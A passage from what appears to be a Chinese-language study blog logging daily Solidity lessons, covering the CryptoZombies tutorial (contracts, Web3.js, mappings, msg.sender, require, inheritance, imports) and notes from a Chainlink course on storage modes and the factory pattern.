class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">// 这里建立事件</span><br><span class="line">    event NewZombie(uint zombieId, string name, uint dna);</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">    function _createZombie(string _name, uint _dna) private {</span><br><span class="line">        uint id = zombies.push(Zombie(_name, _dna)) - 1;</span><br><span class="line">        //// 这里触发事件</span><br><span class="line">        NewZombie(id, _name, _dna);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function _generateRandomDna(string _str) private view returns (uint) {</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        return rand % dnaModulus;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function createRandomZombie(string _name) public {</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createZombie(_name, randDna);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第14章-Web3-js"><a href="#第14章-Web3-js" class="headerlink" title="第14章: Web3.js"></a>第14章: Web3.js</h3><p>我们的 Solidity 合约完工了！ 现在我们要写一段 JavaScript 前端代码来调用这个合约。</p><p>以太坊有一个 JavaScript 库，名为<strong>Web3.js</strong>。</p><p>在后面的课程里，我们会进一步地教你如何安装一个合约，如何设置Web3.js。 但是现在我们通过一段代码来了解 Web3.js 是如何和我们发布的合约交互的吧。</p><p>如果下面的代码你不能全都理解，不用担心。</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 下面是调用合约的方式:</span></span><br><span class="line"><span class="keyword">var</span> abi = <span class="comment">/* abi是由编译器生成的 */</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">ZombieFactoryContract</span> = web3.<span class="property">eth</span>.<span class="title function_">contract</span>(abi)</span><br><span class="line"><span class="keyword">var</span> contractAddress = <span class="comment">/* 发布之后在以太坊上生成的合约地址 */</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">ZombieFactory</span> = <span class="title class_">ZombieFactoryContract</span>.<span class="title function_">at</span>(contractAddress)</span><br><span class="line"><span class="comment">// `ZombieFactory` 能访问公共的函数以及事件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 某个监听文本输入的监听器:</span></span><br><span class="line">$(<span class="string">"#ourButton"</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params">e</span>) {</span><br><span class="line">  <span class="keyword">var</span> name = $(<span class="string">"#nameInput"</span>).<span class="title function_">val</span>()</span><br><span class="line">  <span class="comment">//调用合约的 `createRandomZombie` 函数:</span></span><br><span class="line">  <span class="title class_">ZombieFactory</span>.<span class="title function_">createRandomZombie</span>(name)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听 `NewZombie` 事件, 并且更新UI</span></span><br><span class="line"><span class="keyword">var</span> event = <span class="title class_">ZombieFactory</span>.<span class="title class_">NewZombie</span>(<span class="keyword">function</span>(<span class="params">error, result</span>) {</span><br><span class="line">  <span class="keyword">if</span> (error) <span class="keyword">return</span></span><br><span class="line">  <span class="title function_">generateZombie</span>(result.<span class="property">zombieId</span>, result.<span class="property">name</span>, result.<span class="property">dna</span>)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Zombie 的 dna, 更新图像</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateZombie</span>(<span class="params">id, name, dna</span>) {</span><br><span class="line">  <span class="keyword">let</span> dnaStr = <span class="title class_">String</span>(dna)</span><br><span class="line">  <span class="comment">// 如果dna少于16位,在它前面用0补上</span></span><br><span class="line">  <span class="keyword">while</span> (dnaStr.<span class="property">length</span> &lt; <span class="number">16</span>)</span><br><span class="line">    dnaStr = <span class="string">"0"</span> + dnaStr</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> zombieDetails = {</span><br><span class="line">    <span class="comment">// 前两位数构成头部.我们可能有7种头部, 所以 % 7</span></span><br><span class="line">    <span class="comment">// 得到的数在0-6,再加上1,数的范围变成1-7</span></span><br><span class="line">    <span class="comment">// 通过这样计算：</span></span><br><span class="line">    <span class="attr">headChoice</span>: dnaStr.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">2</span>) % <span class="number">7</span> + <span class="number">1</span>，</span><br><span class="line">    <span class="comment">// 我们得到的图片名称从head1.png 到 head7.png</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接下来的两位数构成眼睛, 眼睛变化就对11取模:</span></span><br><span class="line">    <span class="attr">eyeChoice</span>: dnaStr.<span class="title function_">substring</span>(<span class="number">2</span>, <span class="number">4</span>) % <span class="number">11</span> + <span class="number">1</span>,</span><br><span class="line">    <span class="comment">// 再接下来的两位数构成衣服，衣服变化就对6取模:</span></span><br><span class="line">    <span class="attr">shirtChoice</span>: dnaStr.<span class="title function_">substring</span>(<span class="number">4</span>, <span class="number">6</span>) % <span class="number">6</span> + <span class="number">1</span>,</span><br><span class="line">    <span class="comment">//最后6位控制颜色. 用css选择器: hue-rotate来更新</span></span><br><span class="line">    <span class="comment">// 360度:</span></span><br><span class="line">    <span class="attr">skinColorChoice</span>: <span class="built_in">parseInt</span>(dnaStr.<span class="title function_">substring</span>(<span class="number">6</span>, <span class="number">8</span>) / <span class="number">100</span> * <span class="number">360</span>),</span><br><span class="line">    <span class="attr">eyeColorChoice</span>: <span class="built_in">parseInt</span>(dnaStr.<span class="title function_">substring</span>(<span class="number">8</span>, <span class="number">10</span>) / <span class="number">100</span> * <span class="number">360</span>),</span><br><span class="line">    <span class="attr">clothesColorChoice</span>: <span class="built_in">parseInt</span>(dnaStr.<span class="title function_">substring</span>(<span class="number">10</span>, <span class="number">12</span>) / <span class="number">100</span> * <span class="number">360</span>),</span><br><span class="line">    <span class="attr">zombieName</span>: name,</span><br><span class="line">    <span class="attr">zombieDescription</span>: <span class="string">"A Level 1 CryptoZombie"</span>,</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> zombieDetails</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们的 JavaScript 所做的就是获取由<code>zombieDetails</code> 产生的数据, 并且利用浏览器里的 JavaScript 神奇功能 (我们用 Vue.js)，置换出图像以及使用CSS过滤器。在后面的课程中，你可以看到全部的代码。</p><h1 id="8月9日"><a href="#8月9日" class="headerlink" title="8月9日"></a>8月9日</h1><table><thead><tr><th>今日学习内容</th></tr></thead><tbody><tr><td>安全与合规</td></tr><tr><td>Chainlink预言机的solidity课程</td></tr></tbody></table><h2 id="Chainlink预言机的solidity课程"><a href="#Chainlink预言机的solidity课程" class="headerlink" title="Chainlink预言机的solidity课程"></a>Chainlink预言机的solidity课程</h2><h3 id="solidity数据类型、函数、存储模式、数据结构"><a href="#solidity数据类型、函数、存储模式、数据结构" class="headerlink" title="solidity数据类型、函数、存储模式、数据结构"></a>solidity数据类型、函数、存储模式、数据结构</h3><p>今天主要看了B站Chainlink预言机的solidity课程，然后跟着使用remix工具，进行简单的合约编写以及部署，学习到的包括数据结构、函数等内容，在昨天的CryptoZombiesx的课程中也都学过一遍，所以也就算是复习一遍了。</p><p>还有就是你觉得这个课程讲的真的很好，不仅讲解了密码学中包括公私钥加密原理，甚至还讲解了助记词产生过程以及助记词生成私钥的过程。强烈推荐！！</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.30;</span><br><span class="line"></span><br><span class="line">contract HelloWorld{</span><br><span class="line">    string strVar = "HelloWorld";</span><br><span class="line">    struct Info {</span><br><span class="line">        string phrase;</span><br><span class="line">        uint256 id;</span><br><span class="line">        address addr; </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Info[] infos;//结构体数组</span><br><span class="line"></span><br><span class="line">    mapping(uint256 id =&gt; Info info) infoMapping;</span><br><span class="line"></span><br><span class="line">    function seyHello(uint256 _id) public view returns(string memory){</span><br><span class="line">    //通过判断是否存在地址，从而判断是否写入成功</span><br><span class="line">    //Mapping方式</span><br><span class="line">        if(infoMapping[_id].addr == address(0x0)){</span><br><span class="line">            return addinfo(strVar);</span><br><span class="line">        }</span><br><span class="line">        else {</span><br><span class="line">            return addinfo(infoMapping[_id].phrase);</span><br><span class="line">        }</span><br><span class="line">//for遍历方式，在infos数组很大时，遍历查询的消耗大，所以建议使用mapping键值对查询</span><br><span class="line">        // for(uint256 i=0; i &lt; infos.length; i++ ){</span><br><span class="line">        //     if(infos[i].id == _id){</span><br><span class="line">        //         return addinfo(infos[i].phrase);</span><br><span class="line">        //     }</span><br><span class="line">        // }</span><br><span class="line">        // return addinfo(strVar);</span><br><span class="line">    }</span><br><span class="line">    function setHelloWorld(string memory newString, uint256 _id) public {</span><br><span class="line">        Info memory info = Info(newString, _id, msg.sender);</span><br><span class="line">        infoMapping[_id] = info; </span><br><span class="line">    } </span><br><span class="line">    function addinfo(string memory helloWorldStr) internal pure returns(string memory){</span><br><span class="line">        return string.concat(helloWorldStr," from xxx's contract.");</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>SPDX-License-Identifier：明确声明其使用的开源许可证。它通常以注释的形式出现在文件头部，帮助开发者、法律团队和自动化工具快速识别代码的许可条款</p><p>view：函数中只有读取操作，没有修改操作</p><p>pure：函数中种只需要进行运算，不需要读取任何变量</p><p>四个可见度标识符：</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-09%20200259.png" style="zoom:67%;"><p><strong>存储模式</strong>：</p><p>永久性存储：storage</p><p>暂时性存储（交易结束后值就消失了）：memory、calldata</p><p>1、storage：永久存在合约内，合约中声明的默认是该类型，但不需要显示写出该关键词</p><p>2、memory：变量在运行时可以更改</p><p>3、calldata：变量在运行时不能更改，例如函数传参，用calldata传参数，函数中该值是不能改变的</p><p>4、stack</p><p>5、codes</p><p>6、logs</p><p><strong>数据结构</strong>：</p><p>1、struct：结构体</p><p>2、array：数组</p><p>3、mapping：映射（键值对表示）</p><h3 id="solidity的工厂模式"><a href="#solidity的工厂模式" class="headerlink" title="solidity的工厂模式"></a>solidity的工厂模式</h3><h4 id="工厂模式介绍"><a href="#工厂模式介绍" class="headerlink" title="工厂模式介绍"></a>工厂模式介绍</h4><p>在 Solidity 中，<strong>工厂模式（Factory Pattern）</strong> 是一种常用的智能合约设计模式，用于 <strong>动态创建和管理其他合约的实例</strong>。工厂合约（Factory Contract）负责部署子合约（Child Contracts），通常用于以下场景：</p><ul><li>批量创建相同逻辑的合约（如代币、NFT、多签钱包等）。</li><li>降低重复部署的成本（通过复用逻辑合约）。</li><li>统一管理子合约地址。</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract Factory {</span><br><span class="line">      Child[] children;</span><br><span class="line">      function createChild(uint data){</span><br><span class="line">         Child child = new Child(data);</span><br><span class="line">         children.push(child);</span><br><span class="line">      }</span><br><span class="line">}</span><br><span class="line">contract Child{</span><br><span class="line">     uint data;</span><br><span class="line">     constructor(uint _data){</span><br><span class="line">        data = _data;</span><br><span class="line">     }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="引入合约方式"><a href="#引入合约方式" class="headerlink" title="引入合约方式"></a>引入合约方式</h4><p>直接引入同一个文件系统下的合约</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import { HelloWorld } from "./test.sol";</span><br></pre></td></tr></tbody></table></figure><p>也可以直接引入网上的URL以及可以精准写入sol文件中具体的合约名称</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import { HelloWorld } from "https://11111/test.sol";</span><br></pre></td></tr></tbody></table></figure><p>在实际应用中，涉及到公司的内容，会有更专业的引入方式，通过引入包的方式</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import { HelloWorld } from "@companyName/product/contract";</span><br></pre></td></tr></tbody></table></figure><h1 id="8月10日"><a href="#8月10日" class="headerlink" title="8月10日"></a>8月10日</h1><table><thead><tr><th>今日学习内容</th></tr></thead><tbody><tr><td>CryptoZombiesx的solidity学习/Solidity: Beginner to Intermediate Smart Contracts/lesson2 僵尸攻击人类</td></tr></tbody></table><h2 id="CryptoZombiesx的solidity学习-1"><a href="#CryptoZombiesx的solidity学习-1" class="headerlink" title="CryptoZombiesx的solidity学习"></a>CryptoZombiesx的solidity学习</h2><h3 id="Solidity-Beginner-to-Intermediate-Smart-Contracts-1"><a href="#Solidity-Beginner-to-Intermediate-Smart-Contracts-1" class="headerlink" title="Solidity: Beginner to Intermediate Smart Contracts"></a>Solidity: Beginner to Intermediate Smart Contracts</h3><h3 id="lesson2-僵尸攻击人类"><a href="#lesson2-僵尸攻击人类" class="headerlink" title="lesson2 僵尸攻击人类"></a>lesson2 僵尸攻击人类</h3><h3 id="第2章-映射（Mapping）和地址（Address）"><a href="#第2章-映射（Mapping）和地址（Address）" class="headerlink" title="第2章: 映射（Mapping）和地址（Address）"></a>第2章: 映射（Mapping）和地址（Address）</h3><p>我们通过给数据库中的僵尸指定“主人”， 来支持“多玩家”模式。</p><p>如此一来，我们需要引入2个新的数据类型：<code>mapping</code>（映射） 和 <code>address</code>（地址）。</p><p><strong>Addresses （地址）</strong></p><p>以太坊区块链由 <strong>_ account _</strong> (账户)组成，你可以把它想象成银行账户。一个帐户的余额是 <strong><em>以太</em></strong> （在以太坊区块链上使用的币种），你可以和其他帐户之间支付和接受以太币，就像你的银行帐户可以电汇资金到其他银行帐户一样。</p><p>每个帐户都有一个“地址”，你可以把它想象成银行账号。这是账户唯一的标识符，它看起来长这样：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0cE446255506E92DF41614C46F1d6df9Cc969183</span><br></pre></td></tr></tbody></table></figure><p>（这是 CryptoZombies 团队的地址，如果你喜欢 CryptoZombies 的话，请打赏我们一些以太币！😉）</p><p>我们将在后面的课程中介绍地址的细节，现在你只需要了解<strong>地址属于特定用户（或智能合约）的</strong>。</p><p>所以我们可以指定“地址”作为僵尸主人的 ID。当用户通过与我们的应用程序交互来创建新的僵尸时，新僵尸的所有权被设置到调用者的以太坊地址下。</p><p><strong>Mapping（映射）</strong></p><p>在第1课中，我们看到了 <strong>结构体</strong> 和 <strong>数组</strong> 。 <strong>映射</strong> 是另一种在 Solidity 中存储有组织数据的方法。</p><p>映射是这样定义的：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对于金融应用程序，将用户的余额保存在一个 uint类型的变量中：</span><br><span class="line">mapping (address =&gt; uint) public accountBalance;</span><br><span class="line">//或者可以用来通过userId 存储/查找的用户名</span><br><span class="line">mapping (uint =&gt; string) userIdToName;</span><br></pre></td></tr></tbody></table></figure><p>映射本质上是存储和查找数据所用的<strong>键-值对</strong>。在第一个例子中，键是一个 <code>address</code>，值是一个 <code>uint</code>，在第二个例子中，键是一个<code>uint</code>，值是一个 <code>string</code>。</p><p><strong>实战演习</strong></p><p>为了存储僵尸的所有权，我们会使用到两个映射：一个记录僵尸拥有者的地址，另一个记录某地址所拥有僵尸的数量。</p><p>1.创建一个叫做 <code>zombieToOwner</code> 的映射。其键是一个<code>uint</code>（我们将根据它的 id 存储和查找僵尸），值为 <code>address</code>。映射属性为<code>public</code>。</p><p>2.创建一个名为 <code>ownerZombieCount</code> 的映射，其中键是 <code>address</code>，值是 <code>uint</code>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 在这里定义映射</span><br><span class="line">mapping (uint =&gt; address ) public zombieToOwner;</span><br><span class="line">mapping ( address =&gt; uint) ownerZombieCount;</span><br></pre></td></tr></tbody></table></figure><h3 id="第3章-Msg-sender"><a href="#第3章-Msg-sender" class="headerlink" title="第3章: Msg.sender"></a>第3章: Msg.sender</h3><p>现在有了一套映射来记录僵尸的所有权了，我们可以修改 <code>_createZombie</code> 方法来运用它们。</p><p>为了做到这一点，我们要用到 <code>msg.sender</code>。</p><p><strong>msg.sender</strong></p><p>在 Solidity 中，有一些全局变量可以被所有函数调用。 其中一个就是 <code>msg.sender</code>，它指的是当前调用者（或智能合约）的 <code>address</code>。</p><blockquote><p>注意：在 Solidity 中，功能执行始终需要从外部调用者开始。 一个合约只会在区块链上什么也不做，除非有人调用其中的函数。所以 <code>msg.sender</code>总是存在的。</p></blockquote><p>以下是使用 <code>msg.sender</code> 来更新 <code>mapping</code> 的例子：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mapping (address =&gt; uint) favoriteNumber;</span><br><span class="line"></span><br><span class="line">function setMyNumber(uint _myNumber) public {</span><br><span class="line">  // 更新我们的 `favoriteNumber` 映射来将 `_myNumber`存储在 `msg.sender`名下</span><br><span class="line">  favoriteNumber[msg.sender] = _myNumber;</span><br><span class="line">  // 存储数据至映射的方法和将数据存储在数组相似</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">function whatIsMyNumber() public view returns (uint) {</span><br><span class="line">  // 拿到存储在调用者地址名下的值</span><br><span class="line">  // 若调用者还没调用 setMyNumber， 则值为 `0`</span><br><span class="line">  return favoriteNumber[msg.sender];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在这个小小的例子中，任何人都可以调用 <code>setMyNumber</code> 在我们的合约中存下一个 <code>uint</code> 并且与他们的地址相绑定。 然后，他们调用 <code>whatIsMyNumber</code> 就会返回他们存储的 <code>uint</code>。</p><p>使用 <code>msg.sender</code> 很安全，因为它具有以太坊区块链的安全保障 —— 除非窃取与以太坊地址相关联的私钥，否则是没有办法修改其他人的数据的。</p><p><strong>实战演习</strong></p><p>我们来修改第1课的 <code>_createZombie</code> 方法，将僵尸分配给函数调用者吧。</p><ol><li>首先，在得到新的僵尸 <code>id</code> 后，更新 <code>zombieToOwner</code> 映射，在 <code>id</code> 下面存入 <code>msg.sender</code>。</li><li>然后，我们为这个 <code>msg.sender</code> 名下的 <code>ownerZombieCount</code> 加 1。</li></ol><p>跟在 JavaScript 中一样， 在 Solidity 中你也可以用 <code>++</code> 使 <code>uint</code> 递增。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uint number = 0;</span><br><span class="line">number++;</span><br><span class="line">// `number` 现在是 `1`了</span><br></pre></td></tr></tbody></table></figure><p>修改两行代码即可。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function _createZombie(string _name, uint _dna) private {</span><br><span class="line">        uint id = zombies.push(Zombie(_name, _dna)) - 1;</span><br><span class="line">        // 从这里开始</span><br><span class="line">        zombieToOwner[id] = msg.sender;</span><br><span class="line">        ownerZombieCount[msg.sender]++;</span><br><span class="line">        NewZombie(id, _name, _dna);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h3 id="第4章-Require"><a href="#第4章-Require" class="headerlink" title="第4章: Require"></a>第4章: Require</h3><p>在第一课中，我们成功让用户通过调用 <code>createRandomZombie</code>函数 并输入一个名字来创建新的僵尸。 但是，如果用户能持续调用这个函数来创建出无限多个僵尸加入他们的军团，这游戏就太没意思了！</p><p>于是，我们作出限定：每个玩家只能调用一次这个函数。 这样一来，新玩家可以在刚开始玩游戏时通过调用它，为其军团创建初始僵尸。</p><p>我们怎样才能限定每个玩家只调用一次这个函数呢？</p><p>答案是使用<code>require</code>。 <code>require</code>使得函数在执行过程中，当不满足某些条件时抛出错误，并停止执行：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function sayHiToVitalik(string _name) public returns (string) {</span><br><span class="line">  // 比较 _name 是否等于 "Vitalik". 如果不成立，抛出异常并终止程序</span><br><span class="line">  // (敲黑板: Solidity 并不支持原生的字符串比较, 我们只能通过比较</span><br><span class="line">  // 两字符串的 keccak256 哈希值来进行判断)</span><br><span class="line">  require(keccak256(_name) == keccak256("Vitalik"));</span><br><span class="line">  // 如果返回 true, 运行如下语句</span><br><span class="line">  return "Hi!";</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果你这样调用函数 <code>sayHiToVitalik（“Vitalik”）</code> ,它会返回“Hi！”。而如果调用的时候使用了其他参数，它则会抛出错误并停止执行。</p><p>因此，在调用一个函数之前，用 <code>require</code> 验证前置条件是非常有必要的。</p><p><strong>实战演习</strong></p><p>在我们的僵尸游戏中，我们不希望用户通过反复调用 <code>createRandomZombie</code> 来給他们的军队创建无限多个僵尸 —— 这将使得游戏非常无聊。</p><p>我们使用了 <code>require</code> 来确保这个函数只有在每个用户第一次调用它的时候执行，用以创建初始僵尸。</p><ol><li>在 <code>createRandomZombie</code> 的前面放置 <code>require</code> 语句。 使得函数先检查 <code>ownerZombieCount [msg.sender]</code> 的值为 <code>0</code> ，不然就抛出一个错误。</li></ol><blockquote><p>注意：在 Solidity 中，关键词放置的顺序并不重要</p><ul><li>虽然参数的两个位置是等效的。 但是，由于我们的答案检查器比较呆板，它只能认定其中一个为正确答案</li><li>于是在这里，我们就约定把<code>ownerZombieCount [msg.sender]</code>放前面吧</li></ul></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function createRandomZombie(string _name) public {</span><br><span class="line">        // start here</span><br><span class="line">        require(ownerZombieCount[msg.sender] == 0);</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createZombie(_name, randDna);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h3 id="第5章-继承（Inheritance）"><a href="#第5章-继承（Inheritance）" class="headerlink" title="第5章: 继承（Inheritance）"></a>第5章: 继承（Inheritance）</h3><p>我们的游戏代码越来越长。 当代码过于冗长的时候，最好将代码和逻辑分拆到多个不同的合约中，以便于管理。</p><p>有个让 Solidity 的代码易于管理的功能，就是合约 *<strong>inheritance*</strong> (继承)：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Doge {</span><br><span class="line">  function catchphrase() public returns (string) {</span><br><span class="line">    return "So Wow CryptoDoge";</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract BabyDoge is Doge {</span><br><span class="line">  function anotherCatchphrase() public returns (string) {</span><br><span class="line">    return "Such Moon BabyDoge";</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>由于 <code>BabyDoge</code> 是从 <code>Doge</code> 那里 *<strong>inherits*</strong> （继承)过来的。 这意味着当你编译和部署了 <code>BabyDoge</code>，它将可以访问 <code>catchphrase()</code> 和 <code>anotherCatchphrase()</code>和其他我们在 <code>Doge</code> 中定义的其他公共函数。</p><p>这可以用于逻辑继承（比如表达子类的时候，<code>Cat</code> 是一种 <code>Animal</code>）。 但也可以简单地将类似的逻辑组合到不同的合约中以组织代码。</p><p><strong>实战演习</strong></p><p>在接下来的章节中，我们将要为僵尸实现各种功能，让它可以“猎食”和“繁殖”。 通过将这些运算放到父类 <code>ZombieFactory</code> 中，使得所有 <code>ZombieFactory</code> 的继承者合约都可以使用这些方法。</p><ol><li>在 <code>ZombieFactory</code> 下创建一个叫 <code>ZombieFeeding</code> 的合约，它是继承自 `ZombieFactory 合约的。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// Start here</span><br><span class="line">contract ZombieFeeding is ZombieFactory {</span><br><span class="line">    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第6章-引入（Import）"><a href="#第6章-引入（Import）" class="headerlink" title="第6章: 引入（Import）"></a>第6章: 引入（Import）</h3><p>哇！你有没有注意到，我们只是清理了下右边的代码，现在你的编辑器的顶部就多了个选项卡。 尝试点击它的标签，看看会发生什么吧！</p><p>代码已经够长了，我们把它分成多个文件以便于管理。 通常情况下，当 Solidity 项目中的代码太长的时候我们就是这么做的。</p><p>在 Solidity 中，当你有多个文件并且想把一个文件导入另一个文件时，可以使用 <code>import</code> 语句：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import "./someothercontract.sol";</span><br><span class="line"></span><br><span class="line">contract newContract is SomeOtherContract {</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这样当我们在合约（contract）目录下有一个名为 <code>someothercontract.sol</code> 的文件（ <code>./</code> 就是同一目录的意思），它就会被编译器导入。</p><p><strong>实战演习</strong></p><p>现在我们已经建立了一个多文件架构，并用 <code>import</code> 来读取来自另一个文件中合约的内容：</p><p>1.将 <code>zombiefactory.sol</code> 导入到我们的新文件 <code>zombiefeeding.sol</code> 中。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// put import statement here</span><br><span class="line">import "./zombiefactory.sol";</span><br></pre></td></tr></tbody></table></figure><h3 id="第7章-Storage与Memory"><a href="#第7章-Storage与Memory" class="headerlink" title="第7章: Storage与Memory"></a>第7章: Storage与Memory</h3><p>在 Solidity 中，有两个地方可以存储变量 —— <code>storage</code> 或 